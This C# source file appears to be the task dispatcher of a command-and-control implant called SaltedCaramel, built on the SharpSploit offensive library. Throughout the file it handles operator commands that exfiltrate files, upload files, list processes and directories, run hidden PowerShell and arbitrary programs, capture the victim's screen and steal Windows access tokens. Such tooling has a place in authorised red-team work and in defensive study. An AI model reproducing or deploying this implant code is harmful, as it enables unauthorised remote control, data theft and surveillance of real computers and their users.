using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using SharpSploit.Enumeration;
using SharpSploit.Execution;
using SharpSploit.Generic;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace SaltedCaramel
{
    /// <summary>
    /// A task to assign to an implant
    /// </summary>
    internal class SaltedCaramelTask
    {
        internal string command { get; set; }
        internal string @params { get; set; }
        internal string id { get; set; }

        public SaltedCaramelTask(string command, string @params, string id)
        {
            this.command = command;
            this.@params = @params;
            this.id = id;
        }

        /// <summary>
        /// Handle a new task.
        /// </summary>
        /// <param name="implant">The CaramelImplant we're handling a task for</param>
        public void DispatchTask(SaltedCaramelImplant implant)
        {
            if (this.command == "exit")
            {
                Debug.WriteLine("[-] Tasked to exit");
                try
                {
                    implant.SendComplete(this.id);
                }
                catch (Exception e)
                {
                    implant.SendError(this.id, e.Message);
                }
                Environment.Exit(0);
            }
            else if (this.command == "download")
            {
                Debug.WriteLine("[-] Tasked to send file " + this.@params);
                string file = this.@params;
                implant.SendFile(this.id, file);
            }
            else if (this.command == "upload")
            {
                JObject json = (JObject)JsonConvert.DeserializeObject(this.@params);
                string file_id = json.Value<string>("file_id");
                string filepath = json.Value<string>("remote_path");
                Debug.WriteLine("[-] Tasked to get file " + file_id);
                // If file exists, don't write file
                if (File.Exists(filepath))
                {
                    Debug.WriteLine($"[!] ERROR: File exists: {filepath}");
                    implant.SendError(this.id, "ERROR: File exists.");
                }
                else
                {
                    implant.GetFile(file_id, filepath, this.id);
                }
            }
            else if (this.command == "ps")
            {
                Debug.WriteLine("[-] Tasked to list processes");
                SharpSploitResultList<Host.ProcessResult> processResult = Host.GetProcessList();
                List<Dictionary<string, string>> procList = new List<Dictionary<string, string>>();
                foreach (Host.ProcessResult item in processResult)
                {
                    Dictionary<string, string> proc = new Dictionary<string, string>();
                    proc.Add("process_id", item.Pid.ToString());
                    proc.Add("parent_process_id", item.Ppid.ToString());
                    proc.Add("name", item.Name);

                    procList.Add(proc);
                }
                processResult.Clear();

                /* SortedList so that we get processes back sorted by PID
                 * 
                 * Had to put the processes in this way because it throws an error
                 * when trying to serialize a list of procs if we don't have admin */
                //SortedList<int, string> procs = new SortedList<int, string>();
                /*
                foreach (Process proc in procList)
                {
                    int pid = proc.Id;
                    string name = proc.ProcessName;
                    procs.Add(pid, name);
                } */

                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(procList), this.id);
                implant.PostResponse(response);
                implant.SendComplete(this.id);
            }
            else if (this.command == "ls")
            {
                string path = this.@params;
                Debug.WriteLine("[-] Tasked to list directory " + path);
                SharpSploitResultList<Host.FileSystemEntryResult> list;

                try
                {
                    if (path != "")
                        list = Host.GetDirectoryListing(path);
                    else
                        list = Host.GetDirectoryListing();

                    List<Dictionary<string, string>> fileList = new List<Dictionary<string, string>>();

                    foreach (Host.FileSystemEntryResult item in list)
                    {
                        FileInfo f = new FileInfo(item.Name);
                        Dictionary<string, string> infoDict = new Dictionary<string, string>();
                        try
                        {
                            infoDict.Add("size", f.Length.ToString());
                            infoDict.Add("type", "file");
                            infoDict.Add("name", f.Name);
                            fileList.Add(infoDict);
                        }
                        catch
                        {
                            infoDict.Add("size", "0");
                            infoDict.Add("type", "dir");
                            infoDict.Add("name", item.Name);
                            fileList.Add(infoDict);
                        }
                    }

                    TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(fileList), this.id);
                    implant.PostResponse(response);
                    implant.SendComplete(this.id);
                }
                catch (DirectoryNotFoundException)
                {
                    implant.SendError(this.id, "Error: Directory not found.");
                }
            }
            else if (this.command == "powershell")
            {
                Debug.WriteLine("[-] Tasked to run powershell");
                string args = this.@params;

                string result = Shell.PowerShellExecute(args);

                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(result), this.id);
                implant.PostResponse(response);
                implant.SendComplete(this.id);
            }
            else if (this.command == "run")
            {
                // TODO: Figure out how to hook StandardError and StandardOutput at the same time
                string[] split = this.@params.Trim().Split(' ');
                string argString = string.Join(" ", split.Skip(1).ToArray());
                ProcessStartInfo startInfo = new ProcessStartInfo();
                if (implant.hasAlternateToken() == true)
                {
                    startInfo.WorkingDirectory = "C:\\Temp";
                }
                startInfo.FileName = split[0];
                startInfo.Arguments = argString;
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.CreateNoWindow = true;

                Process proc = new Process();
                proc.StartInfo = startInfo;

                string procOutput = "";
                try
                {
                    Debug.WriteLine("[-] Tasked to start process " + startInfo.FileName);
                    proc.Start();

                    while (!proc.StandardOutput.EndOfStream)
                    {
                        string line = proc.StandardOutput.ReadLine();
                        procOutput += line + "\n";
                    }

                    // Strip unnecessary newline
                    // TODO: fix the need for this
                    procOutput = procOutput.TrimEnd();
                    proc.WaitForExit();
                    TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(procOutput), this.id);
                    implant.PostResponse(response);
                    implant.SendComplete(this.id);
                }
                catch (Exception e)
                {
                    implant.SendError(this.id, e.Message);
                }
            }
            else if (this.command == "screencapture")
            {
                Debug.WriteLine("[-] Tasked to take screenshot.");
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                Bitmap bm = new Bitmap(bounds.Width, bounds.Height);
                Graphics g = Graphics.FromImage(bm);
                g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);

                using (MemoryStream ms = new MemoryStream())
                {
                    bm.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    byte[] screenshot = ms.ToArray();

                    implant.SendScreenshot(this.id, screenshot);
                }
            }
            else if (this.command == "sleep")
            {
                try
                {
                    int sleep = Convert.ToInt32(this.@params);
                    Debug.WriteLine("[-] Tasked to change sleep to: " + sleep);
                    implant.sleep = sleep * 1000;
                    implant.SendComplete(this.id);
                }
                catch
                {
                    implant.SendError(this.id, "ERROR: argument provided was not an int.");
                }
            }
            else if (this.command == "steal_token")
            {
                Token.StealToken(780);
            }
            else if (this.command == "reset_token")
            {
                Token.stolenHandle = IntPtr.Zero;
            }
        }
    }
}